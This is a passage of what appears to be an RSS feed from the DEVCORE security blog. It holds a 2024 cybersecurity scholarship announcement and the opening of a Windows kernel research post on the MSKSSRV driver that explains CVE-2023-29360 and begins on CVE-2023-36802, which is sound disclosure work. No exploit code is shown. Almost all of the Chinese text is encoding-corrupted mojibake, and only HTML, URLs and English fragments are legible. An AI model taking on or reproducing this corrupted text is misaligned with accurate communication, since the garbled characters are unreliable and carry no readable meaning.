                <title>DEVCORE 2024 ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄÅË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÁï´Âç≥Êó•Ëµ∑ÈñãÊîæÂ†±Âêç</title>
                <description>&lt;p&gt;ÁπºËºî‰ªÅÂ§ßÂ≠∏ÂèäÂúãÁ´ãËá∫ÁÅ£ÁßëÊäÄÂ§ßÂ≠∏Êà¥Â§´ÂØáÁàæË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏ÈáëÈ†íÂ∏ÉÂæåÔºåÊàëÂÄëÂæàÈ´òËààÂú∞ÂÆ£‰ΩàÔºå2024 Âπ¥Â∫¶„ÄåÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÂèä„ÄåË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÁï´„ÄçÊñºÂç≥Êó•Ëµ∑ÈñãÊîæÂ†±Âêç„ÄÇ&lt;/p&gt;

&lt;p&gt;Ëá™ 2012 Âπ¥ÂâµÁ´ã‰πãÂàùÔºåDEVCORE Âç≥ÁßâÊåÅËëóÊèêÂçáÂè∞ÁÅ£Ë≥áÂÆâÁ´∂Áà≠Âäõ„ÄÅËÆì‰∏ñÁïåÊõ¥ÂÆâÂÖ®ÁöÑÂàùË°∑ÔºåÂ∞á‰∫∫ÊâçÂüπËÇ≤Ë¶ñÁÇ∫Â∑±‰ªªÔºåÈÄèÈÅéÂèÉËàáÊïôËÇ≤ÈÉ®Ë≥áÂÆâ‰∫∫ÊâçÂüπËÇ≤Ë®àÁï´„ÄÅÂâµËæ¶ DEVCORE ÂØ¶ÁøíÁîüË®àÁï´„ÄÅÂïüÂãïÊà¥Â§´ÂØáÁàæË≥áÂÆâÁçéÂ≠∏Èáë„ÄÅËæ¶ÁêÜË≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÁï´Á≠âÊñπÂºèÔºåÂçîÂä©Ë≥áÂÆâ‰∫∫ÊâçËåÅÂ£ØÊàêÈï∑„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;devcore-ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë&quot;&gt;DEVCORE ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë&lt;/h3&gt;

&lt;p&gt;DEVCORE Êñº 2020 Âπ¥È¶ñÊ¨°ËàâËæ¶„ÄåÊà¥Â§´ÂØáÁàæË≥áÂÆâÁçéÂ≠∏ÈáëË®àÁï´„ÄçÔºåÂéüÁÇ∫ÊÑüÂøµÈÅéÂéªÂ≠∏ÁîüÊôÇ‰ª£ÂèóÂà∞ÁöÑÂ§öÊñπË≥áÊ∫êÂèäÈºìÂãµÔºåÁçéÂ≠∏ÈáëÈ†íÁôºÁØÑÂúçÁÇ∫Á∂ìÁáüÂúòÈöäÊØçÊ†°ÁöÑËºî‰ªÅÂ§ßÂ≠∏ÂèäÂúãÁ´ãËá∫ÁÅ£ÁßëÊäÄÂ§ßÂ≠∏ÔºåÂæåÁÇ∫ÂüπËÇ≤Êõ¥Â§öÊúâÂøóÈùíÂπ¥Â≠∏Â≠êÔºåÊì¥Â§ßÁçéÂ≠∏ÈáëÁØÑÂúçÔºåÈñãÊîæÂÖ®ÂúãÂêÑÂú∞Â≠∏ÁîüÂ†±ÂêçÁî≥Ë´ãÔºåÊúüÂæÖËÉΩÊé®Âª£„ÄåÈß≠ÂÆ¢ÊÄùÁ∂≠„Äç„ÄÅÂº∑ÂåñË≥áÂÆâÊäÄËÉΩÔºå‰∏¶Âπ´Âä©Âú®Â≠∏Â≠∏Áîü‰∫ÜËß£Ë≥áÂÆâÁî¢Ê•≠ÁîüÊÖãÂèäÁèæÊ≥Å„ÄÅÈôç‰ΩéÂ≠∏Áî®ËêΩÂ∑ÆÔºåÊú™‰æÜÊàêÁÇ∫Êñ∞‰∏Ä‰ª£ÁöÑÊîªÊìäÂûãË≥áÂÆâ‰∫∫ÊâçÔºåÁÇ∫Ë≥áÂÆâÁî¢Ê•≠Ê≥®ÂÖ•Êñ∞Ê¥ªÂäõ„ÄÇ&lt;/p&gt;

&lt;p&gt;„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÊ≠°ËøéÊâÄÊúâÂú®Ë≥áË®äÂÆâÂÖ®È†òÂüüÊúâÂá∫ÁúæÁ†îÁ©∂ÊàêÊûúÁöÑÂ≠∏ÁîüÂ†±ÂêçÁî≥Ë´ãÔºåÊúâÊÑèÁî≥Ë´ãËÄÖÈ†àÊèêÂá∫Â≠∏ÁøíË≥áÂÆâÁöÑÂãïÊ©üËàáÊ≠∑Á®ãÔºå‰∏¶Áπ≥‰∫§Ë≥áÂÆâÁ†îÁ©∂ÊàñÊØîË≥ΩÊàêÊûúÔºåÊàëÂÄëÂ∞áÂæû‰∏≠ÊìáÂÑ™ÈÅ∏Âèñ 10 ÂêçÔºåÁç≤ÈÅ∏ËÄÖÂèØÁç≤ÊúÄÈ´ò 2 Ëê¨ÂÖÉÁöÑÁ†îÁ©∂Ë£úÂä©„ÄÇË©≥Á¥∞Áî≥Ë´ãËæ¶Ê≥ïÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöÂÖ®ÂúãÂêÑÂ§ßÂ∞àÈô¢Ê†°Â≠∏ÁîüÁöÜÂèØ‰ª•Áî≥Ë´ã„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁçéÂ≠∏ÈáëÈáëÈ°ç/ÂêçÈ°çÔºöÊØèÂπ¥Â∫¶Âèñ 10 ÂêçÔºåÊØèÂêçÂèØÁç≤ÂæóÁçéÂ≠∏ÈáëÊñ∞Âè∞Âπ£ 20,000 ÂÖÉÊï¥ÔºåÂÖ±Ë®à 20 Ëê¨ÂÖÉ„ÄÇÂ¶ÇÂ†±ÂêçË∏¥Ë∫çÔºåÊàëÂÄëÂ∞áË¶ñÁî≥Ë´ãÁãÄÊ≥ÅÂ¢ûÂä†ÂêçÈ°ç„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãÊôÇÁ®ãÔºö
    &lt;ul&gt;
      &lt;li&gt;2024/9/6 ÂÆòÁ∂≤ÂÖ¨ÂëäÁçéÂ≠∏ÈáëË®àÁï´Ë≥áË®ä&lt;/li&gt;
      &lt;li&gt;2024/9/6 - 2024/10/3 ÈñãÊîæÊî∂‰ª∂&lt;/li&gt;
      &lt;li&gt;2024/10/31 ÂÖ¨Â∏ÉÂØ©Êü•ÁµêÊûúÔºå‰∏¶Â∞áÊñº 11 Ëá≥ 12 ÊúàÈñìÈ†íÁôºÁçéÂ≠∏Èáë&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãËæ¶Ê≥ïÔºö
    &lt;ul&gt;
      &lt;li&gt;Ë´ã‰æù‚ΩÇ‰ª∂Ê™¢Ê†∏Ë°®È†ÖÊ¨°È†ÜÂ∫èÊéíÂàóÂ∑≤ÈôÑ‚ΩÇ‰ª∂ÔºåÂΩôÊï¥ÁÇ∫‚ºÄ‰ªΩ PDF Ê™îÊ°àÔºåÂØÑ‚æÑ &lt;a href=&quot;mailto:scholarship@devco.re&quot;&gt;scholarship@devco.re&lt;/a&gt;„ÄÇ&lt;/li&gt;
      &lt;li&gt;‰ø°‰ª∂‰∏ªÊó®Âèä PDF Ê™îÊ°àÂêçÁ®±Ë´ãÁ¨¶Âêà‰ª•‰∏ãÊ†ºÂºèÔºö[ÂÖ®ÂúãÁçéÂ≠∏‚æ¶Áî≥Ë´ã] Â≠∏Ê†°ÂêçÁ®±_Â≠∏Ëôü_ÂßìÂêçÔºàÁØÑ‰æãÔºö[ÂÖ®ÂúãÁçéÂ≠∏‚æ¶Áî≥Ë´ã] Ëºî‰ªÅ‚º§Â≠∏_B11100000_Áéã‚º©ÁæéÔºâ„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÁî≥Ë´ã‚ºà‚æÉÊàëÊ™¢Ê†∏‰∏¶ÊñºÁî≥Ë´ã‚ºàÊ™¢Ê†∏ÂçÄÂãæÈÅ∏Â∑≤ÈôÑ‚ΩÇ‰ª∂ÔºåËã•‚ΩÇ‰ª∂‰∏ç‚øëÊàñÊú™Á¢∫ÂØ¶ÂãæÈÅ∏ÊÅï‰∏çÂèóÁêÜÁî≥Ë´ã„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;È†àÊ™¢ÈôÑÊñá‰ª∂Ôºö
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;/assets/files/scholarship/Êà¥Â§´ÂØáÁàæÂÖ®ÂúãÁçéÂ≠∏ÈáëÁî≥Ë´ãË°®.pdf&quot;&gt;Êú¨ÁçéÂ≠∏‚æ¶Áî≥Ë´ãË°®&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Âú®Â≠∏Ë≠âÊòé&lt;/li&gt;
      &lt;li&gt;ÊúÄËøë‚ºÄÂ≠∏ÊúüÊàêÁ∏æÂñÆ&lt;/li&gt;
      &lt;li&gt;Â≠∏ÁøíË≥áË®äÂÆâÂÖ®‰πãÂãïÊ©üËàáÊ≠∑Á®ã‚ººÂæó‚ºÄÁØáÔºöÂ≠óÊï∏ 500 - 2000 Â≠ó&lt;/li&gt;
      &lt;li&gt;Ë≥áË®äÂÆâÂÖ®ÊäÄË°ìÁõ∏ÈóúÁ†îÁ©∂ÊàêÊûúÔºöËá≥Â∞ëÈ†àÂæû‰ª•‰∏ãÂÖ≠È†ÖÁõÆ‰∏≠Êìá‰∏ÄÁπ≥‰∫§ÔºåÂåÖÂê´Á†îË®éÊúÉÊäïÁ®ø„ÄÅÊºèÊ¥ûÁçéÂãµË®àÁï´„ÄÅÂº±ÈªûÁ†îÁ©∂„ÄÅË≥áË®äÂÆâÂÖ®ÊØîË≥Ω„ÄÅË≥áÂÆâÂ∑•ÂÖ∑Á†îÁ©∂„ÄÅÊäÄË°ìÊñáÁ´†ÁôºË°®Á≠âÊàêÊûú&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Á∂ìÁáüÊàêÊûúÔºöËá≥Â∞ëÈ†àÂæû‰ª•‰∏ãÂÖ©È†ÖÁõÆ‰∏≠Êìá‰∏ÄÁπ≥‰∫§ÔºåÂåÖÂê´Ê†°ÂúíË≥áÂÆâÁ§æÂúò„ÄÅÂÖ¨ÈñãË≥áÂÆâÁ§æÁæ§Á≠â&lt;/li&gt;
      &lt;li&gt;Êé®Ëñ¶ÂáΩÔºöÂ∞éÂ∏´„ÄÅÁ≥ª‰∏ª‰ªª„ÄÅÂÖ∂‰ªñÊïôÊéàÊàñÊ•≠Áïå‚ºà‚º†Êé®Ëñ¶ÂáΩÔºå‚æÑÂ∞ëÈ†àÂèñÂæóÂÖ©Â∞Å‰ª•‰∏äÊé®Ëñ¶ÂáΩ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;devcore-Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ&quot;&gt;DEVCORE Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë®àÂäÉ&lt;/h3&gt;

&lt;p&gt;‰ªäÂπ¥ÊàëÂÄë‰πüÂ∞áÊåÅÁ∫åË¥äÂä©Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïÔºåÊèê‰æõÁ∂ìË≤ª‰∫àË≥áÂÆâÁõ∏Èóú‰πãÁ§æÁæ§„ÄÅÁ§æÂúòËæ¶ÁêÜÂêÑÈ†ÖÊ¥ªÂãïÔºåÂáùËÅöÂè∞ÁÅ£Ë≥áÂÆâÁ§æÁæ§ÔºåÂä†ÈÄüÂüπËÇ≤Âè∞ÁÅ£ÁöÑË≥áÂÆâÊñ∞Èä≥„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöËàáË≥áÂÆâË≠∞È°åÁõ∏Èóú‰πãÁ§æÁæ§„ÄÅÁ§æÂúòÊ¥ªÂãïÔºåË´ãÁî± 1 ‰ΩçÁ§æÂúò‰ª£Ë°®‰∫∫Â°´ÂØ´Ë≥áÊñô„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ë¥äÂä©ÈáëÈ°çÔºö‰æùÂêÑÁ§æÂúòÊ¥ªÂãïÈúÄÊ±ÇÂèäËàá DEVCORE ÂúòÈöäË®éË´ñËÄåÂÆöÔºåÊØèÊ¨°ÊúÄÈ´òË£úÂä©ÈáëÈ°çÁÇ∫Êñ∞Âè∞Âπ£ 20,000 ÂÖÉÊï¥„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãÊôÇÁ®ãÔºöÂ¶ÇÊ¨≤Áî≥Ë´ãÊ≠§Ë®àÁï´ÁöÑÁ§æÂúòÊàñÊ¥ªÂãïÔºåË´ãÊñº 2024/10/31 ÂâçÈÄèÈÅé‰ª•‰∏ãÈÄ£ÁµêÂ°´ÂØ´ÂàùÊ≠•Ë≥áÊñôÔºåÊàëÂÄëÂ∞áÊñº 30 Êó•ÂÖßÈÄöÁü•Á¨¶ÂêàÁî≥Ë´ãË≥áÊ†ºËÄÖÊèê‰æõÈÄ≤‰∏ÄÊ≠•Ë≥áÊñôÔºå‰∏çÁ¨¶ÂêàË≥áÊ†ºËÄÖÂ∞á‰∏çÂè¶Ë°åÈÄöÁü•„ÄÇ&lt;/li&gt;
  &lt;li&gt;Áî≥Ë´ãÈÄ£ÁµêÔºö&lt;a href=&quot;https://forms.gle/dW3GcGjw5z8WQ9pV9&quot; target=&quot;_blank&quot;&gt;DEVCORE 2024 Âπ¥Ë≥áÂÆâÊïôËÇ≤Ê¥ªÂãïË¥äÂä©Ë™øÊü•&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;È†àÊèê‰æõË≥áÊñôÔºö
    &lt;ul&gt;
      &lt;li&gt;Áî≥Ë´ãË≥áÊ†ºÔºöÁî≥Ë´ã‰∫∫ÈúÄ‰ª•ÂêÑË≥áÂÆâÁ§æÁæ§ÊàñÁ§æÂúòÂêçÁæ©ÊèêÂá∫Áî≥Ë´ã„ÄÇ&lt;/li&gt;
      &lt;li&gt;ËÅØÁµ°ÈõªÂ≠êÈÉµ‰ª∂&lt;/li&gt;
      &lt;li&gt;ÊÉ≥Ë¶ÅËæ¶ÁêÜÁöÑÊ¥ªÂãïÈ°ûÂûã&lt;/li&gt;
      &lt;li&gt;ÊÉ≥Ë¶ÅËæ¶ÁêÜÁöÑÊ¥ªÂãïÊñπÂºè&lt;/li&gt;
      &lt;li&gt;Ê¥ªÂãïÁ∏ΩÈ†êÁÆó&lt;/li&gt;
      &lt;li&gt;È†êË®àÈúÄË¶ÅË¥äÂä©ÈáëÈ°ç&lt;/li&gt;
      &lt;li&gt;‰ª£Ë°®‰∫∫ÂßìÂêç„ÄÅÈÄ£Áµ°ÈõªË©±&lt;/li&gt;
      &lt;li&gt;ÂúòÈ´îÂêçÁ®±&lt;/li&gt;
      &lt;li&gt;ÂúòÈ´îÂñÆ‰ΩçÁ∂≤ÂùÄ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Ê≥®ÊÑè‰∫ãÈ†ÖÔºö
    &lt;ul&gt;
      &lt;li&gt;Áî≥Ë´ãÊ°àÂØ©Ê†∏Â∞áÁ∂ìÈÅé DEVCORE ÂÖßÈÉ®ÂØ©Ê†∏Ê©üÂà∂Ôºå‰∏¶‰øùÊúâÊúÄÁµÇÊ†∏Ê±∫Ê¨ä„ÄÇ&lt;/li&gt;
      &lt;li&gt;Êú¨ÂïèÂç∑ÂÉÖ‰æõÂàùÊ≠•ÊÑèÈ°òËíêÈõÜÁî®ÈÄîÔºåÁ¨¶ÂêàÁî≥Ë´ãË≥áÊ†ºËÄÖÔºåDEVCORE Â∞áÊñº 30 Êó•ÂÖßÈÄöÁü•Êèê‰æõÈÄ≤‰∏ÄÊ≠•Ë≥áÊñô‰æõÂØ©Ê†∏ÔºåÂÖ∂È§òÂ∞á‰∏çÂè¶Ë°åÈÄöÁü•„ÄÇ&lt;/li&gt;
      &lt;li&gt;DEVCORE ‰øùÊúâ‰øÆÊîπ„ÄÅÊö´ÂÅúÊàñÁµÇÊ≠¢Êú¨Ë¥äÂä©Ë®àÁï´‰πãÊ¨äÂà©„ÄÇ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens/</link>
                <guid>https://devco.re/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens</guid>
                <pubDate>Fri, 06 Sep 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÈÅéÂéªÁöÑÂπæÂçÅÂπ¥‰∏≠ Windows Kernel ÁöÑÊºèÊ¥ûÂ±§Âá∫‰∏çÁ™ÆÔºåÁÜ±ÈñÄÁöÑÊîªÊìäÈù¢ÈÄêÊº∏Âæû Win32k ÊÖ¢ÊÖ¢ËΩâÁßªÂà∞ CLFS (Common Log File System) ‰∏ä„ÄÇÂæÆËªü‰πüÊåÅÁ∫å‰∏îÁ©çÊ•µÂú∞‰øÆË£úÈÄô‰∫õÊºèÊ¥ûÔºå‰ΩøÂæóÈÄô‰∫õÂÖÉ‰ª∂Ë∂ä‰æÜË∂äÂÆâÂÖ®„ÄÇËÄå‰∏ã‰∏ÄÂÄãÁÜ±ÈñÄÁöÑÁõÆÊ®ôÊúÉÊòØÂì™ÂÄãÂÖÉ‰ª∂Âë¢ÔºüÂéªÂπ¥ÈñãÂßãÔºåMSKSSRV (Microsoft Kernel Streaming Service) ÊàêÁÇ∫Èß≠ÂÆ¢ÂñúÊÑõÁöÑÁõÆÊ®ô‰πã‰∏Ä„ÄÇÈÄôÂÄãÈ©ÖÂãïÁ®ãÂºèÂ∞èÂà∞ÂèØ‰ª•Âú®ÂπæÂ§©ÂÖßÂÆåÊàêÂàÜÊûê„ÄÇÈÄôÊòØÂê¶ÊÑèÂë≥ËëóÂèØËÉΩ‰∏çÂ§™ÊúÉÊúâÊñ∞ÁöÑÊºèÊ¥û‰∫ÜÔºü&lt;/p&gt;

&lt;p&gt;Âú®ÈÄôÁØáÁ†îÁ©∂Â∞áË¨õËø∞‰∏ÄÂÄãÈï∑ÊúüË¢´ÂøΩË¶ñÁöÑÊîªÊìäÈù¢ÔºåËÆìÊàëÂÄëÂú®ÂÖ©ÂÄãÊúàÂÖßÂ∞±ÊâæÂá∫‰∫ÜË∂ÖÈÅé 10 ÂÄãÊºèÊ¥û„ÄÇÊ≠§Â§ñÔºå‰πüÂ∞áÊ∑±ÂÖ•Êé¢Ë®é‰∫Ü‰∏ÄÁ®Æ Proxy-Based ÁöÑÈÇèËºØÊºèÊ¥ûÈ°ûÂûãÔºå‰ΩøÊàëÂÄëÂèØ‰ª•ÂøΩÁï•ÊéâÂ§ßÂ§öÊï∏ÁöÑÊ™¢Êü•ÔºåÊúÄÁµÇÊàêÂäüÂú® Pwn2Own Vancouver 2024 ‰∏≠ÔºåÊîª‰∏ã Windows 11 ÁöÑÈ†ÖÁõÆ„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄô‰ªΩÁ†îÁ©∂Â∞áÂàÜÊàêÊï∏ÂÄãÈÉ®ÂàÜ‰æÜÊí∞ÂØ´ÔºåÂàÜÂà•Ë¨õËø∞‰∏çÂêåÁöÑÊºèÊ¥ûÈ°ûÂûãÂèäÊºèÊ¥ûÂûãÊÖãÔºå‰∫¶ÁôºË°®Êñº &lt;a href=&quot;https://hitcon.org/2024/CMT/agenda/&quot;&gt;HITCON CMT 2024&lt;/a&gt; ‰∏≠„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;start-from-mskssrv&quot;&gt;Start from MSKSSRV&lt;/h2&gt;
&lt;blockquote&gt;
  &lt;p&gt;Â∞çÊñº‰∏ÄÈ†ÖÊºèÊ¥ûÁ†îÁ©∂‰æÜË™™ÔºåÂæûÊ≠∑Âè≤ÁöÑÊºèÊ¥ûÁúãËµ∑ÔºåÊòØ‰∏çÂèØÊàñÁº∫ÁöÑ„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ëµ∑ÂàùÔºåÊàëÂÄëÁÇ∫‰∫ÜÊåëÊà∞ Pwn2Own Vancouver 2024 ‰∏≠ Windows 11 ÁöÑÈ†ÖÁõÆÔºåÈñãÂßãÂæûÈÅéÂéªÁöÑ Pwn2Own ‰ª•ÂèäËøëÊúü in-the-wild ÁöÑÊºèÊ¥û‰∏≠ÈñãÂßãÂØ©Ë¶ñÔºåÂ∞ãÊâæÂèØËÉΩÁöÑÊîªÊìäÈù¢„ÄÇÊ≤øËëóÊ≠∑Âè≤ËªåË∑°ÂèØ‰ª•ÂæóÁü•ÔºåÈÅéÂéª‰∏ªË¶ÅË≤†Ë≤¨ GDI Áõ∏ÈóúÊìç‰ΩúÁöÑ Win32K ‰∏ÄÁõ¥ÊòØÂÄãÂæàÁÜ±ÈñÄÁöÑÁõÆÊ®ôÔºåÂæû 2018 Âπ¥‰ª•‰æÜÔºåCLFS (Common Log File System) ‰πüÊº∏Êº∏ÊàêÁÇ∫‰∫ÜÁÜ±ÈñÄÁõÆÊ®ô‰πã‰∏Ä„ÄÇÈÄôÂÖ©ÂÄãÂÖÉ‰ª∂ÈÉΩÈùûÂ∏∏Ë§áÈõúÔºå‰∏¶‰∏îÁõ¥Âà∞ÁèæÂú®‰ªçÁÑ∂Êúâ‰∏çÂ∞ëÊñ∞ÊºèÊ¥ûÂá∫ÁèæÔºå‰ΩÜË¶ÅÁÜüÊÇâÈÄôÂÖ©ÂÄãÂÖÉ‰ª∂ÈúÄË¶ÅËä±‰∏çÂ∞ëÊôÇÈñìÔºåÂêåÊôÇ‰πüÊúâË®±Â§öÁ†îÁ©∂Âì°Âú®ÁúãÈÄôÂÖ©ÂÄãÂÖÉ‰ª∂ÔºåÊâÄ‰ª•ÊúÄÁµÇÊàëÂÄëÊ≤íÊúâÂÖàÈÅ∏ÊìáÂàÜÊûê‰ªñÂÄë„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂéªÂπ¥ &lt;a href=&quot;https://www.synacktiv.com/en&quot;&gt;Synacktiv&lt;/a&gt; Âú® Pwn2Own 2023 ‰∏≠Ôºå‰ΩøÁî® MSKSSRV ÁöÑ&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360&quot;&gt;ÊºèÊ¥û&lt;/a&gt;ÊàêÂäüÊîª‰∏ã Windows 11 ÂæåÔºå‰æøÊúâ‰∏çÂ∞ë‰∫∫ÂæÄÈÄôÂÄãÂÖÉ‰ª∂ÈñãÂßãÁúãËµ∑ÔºåÁü≠ÊôÇÈñìÂÖßÂ∞±ÂèàÂá∫Áèæ‰∫Ü&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802&quot;&gt;Á¨¨‰∫åÂÄãÊºèÊ¥û CVE-2023-36802&lt;/a&gt;ÔºåÈÄôÊôÇ &lt;a href=&quot;https://x.com/chompie1337&quot;&gt;chompie&lt;/a&gt; ‰πüÁôºË°®‰∫Ü‰∏ÄÁØá&lt;a href=&quot;https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/&quot;&gt;ÈùûÂ∏∏Ë©≥Á¥∞ÁöÑÊñáÁ´†&lt;/a&gt;ÔºåË¨õËø∞ÈÄôÂÄãÊºèÊ¥ûÊàêÂõ†ÂèäÂÖ∂Âà©Áî®Á¥∞ÁØÄ„ÄÇÁî±ÊñºÈÄôÂÄãÂÖÉ‰ª∂ÈùûÂ∏∏ÁöÑÂ∞èÔºåÂè™ÁúãÊ™îÊ°àÂ§ßÂ∞èÁ¥ÑÁï•Âè™Êúâ 72 KBÔºåÂèØËÉΩË™çÁúüÁúãÂÄãÂπæÂ§©Â∞±ÂèØ‰ª•ÂÖ®ÈÉ®ÁúãÂÆåÔºåÂõ†Ê≠§ÊàëÂÄë‰æøÊåë‰∫Ü MSKSSRV ‰æÜÂÅöÊ≠∑Âè≤ÊºèÊ¥ûÂàÜÊûêÔºåÁúãÁúãÊòØÂê¶ÊúâÊ©üÊúÉÊäìÂá∫ÂÖ∂‰ªñÊºèÊ¥û„ÄÇ&lt;/p&gt;

&lt;p&gt;Êé•‰∏ã‰æÜÊàëÂÄëÊúÉÊèê‰∏Ä‰∏ãÈÄôÂÖ©ÂÄãÊºèÊ¥ûÔºå‰ΩÜ‰∏çÊúÉËëóÂ¢®ÈÅéÂ§ö„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-29360---logical-vulnerability&quot;&gt;CVE-2023-29360 - logical vulnerability&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÂÄãÊòØ Synacktiv Âú® Pwn2Own 2023 ‰∏≠ÊâÄ‰ΩøÁî®ÁöÑÊºèÊ¥û :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÊòØ‰∏ÄÂÄãÈÇèËºØ‰∏äÁöÑÊºèÊ¥û„ÄÇÁï∂ MSKSSRV ‰ΩøÁî® &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages&quot;&gt;MmProbeAndLockPages&lt;/a&gt; ÈéñÂÆö‰ΩøÁî®ËÄÖÁµ¶ÁöÑË®òÊÜ∂È´î‰ΩçÁΩÆ‰ΩúÁÇ∫ FrameBuffer ÊôÇÔºå‰∏¶Ê≤íÊúâË®≠ÁΩÆÊ≠£Á¢∫ÁöÑ AccessModeÔºåÂ∞éËá¥Ê≤íÊúâÊ™¢Êü•‰ΩøÁî®ËÄÖÊåáÂÆöÁöÑ‰ΩçÁΩÆÊòØÂê¶Â±¨Êñº User space„ÄÇÂ¶ÇÊûú‰ΩøÁî®ËÄÖÁµ¶ÁöÑÊòØ Kernel space ‰∏≠ÁöÑ‰ΩçÁΩÆÔºåÂÆÉÂ∞±ÊúÉÊääÊåáÂÆöÁöÑ Kernel ‰ΩçÁΩÆÊò†Â∞ÑÂà∞ User space Áµ¶‰ΩøÁî®ËÄÖÁî®ÔºåÊúÄÁµÇÂ∞éËá¥‰ΩøÁî®ËÄÖÂèØ‰ª•Â∞ç Kernel ‰∏≠ÁöÑ‰ªªÊÑè‰ΩçÁΩÆÂØ´ÂÖ•ÔºåÂà©Áî®‰∏äÁ∞°ÂñÆ‰∏îÈùûÂ∏∏Á©©ÂÆöÔºåÊàêÁÇ∫‰∫ÜÂèóÊ≠°ËøéÁöÑ&lt;a href=&quot;https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog&quot;&gt;ÊºèÊ¥û‰πã‰∏Ä&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Êõ¥Â§öÁ¥∞ÁØÄÂèØ‰ª•ÂèÉËÄÉ Synacktiv Âú® HITB 2023 HKT ÁöÑ&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;ÊºîË¨õ&lt;/a&gt;Âèä &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; ÁöÑ&lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;ÈÉ®ËêΩÊ†ºÊñáÁ´†&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2023-36802---type-confusion&quot;&gt;CVE-2023-36802 - type confusion&lt;/h3&gt;
&lt;p&gt;ÈÄôÂÄãÊºèÊ¥ûÂâáÊòØÂú® CVE-2023-29360 Âá∫‰æÜÂæåÊ≤íÂ§ö‰πÖË¢´Ë®±Â§ö‰∫∫ÁôºÁèæÔºå‰∏¶‰∏îÂú®ÂæÆËªüÁôº‰ΩàÊõ¥Êñ∞ÊôÇÔºåÂ∞±Â∑≤Á∂ìÂÅµÊ∏¨Âà∞Âà©Áî®ÔºåÊòØÂÄãÈùûÂ∏∏ÂÆπÊòìË¢´ÁôºÁèæÁöÑÊºèÊ¥û„ÄÇMSKSSRV ÊúÉÂÖàÂ∞áÂÖßÈÉ®‰ΩøÁî®ÁöÑÁâ©‰ª∂ÔºàFSContextReg„ÄÅFSStreamRegÔºâÂ≠òÊîæÂú® &lt;a 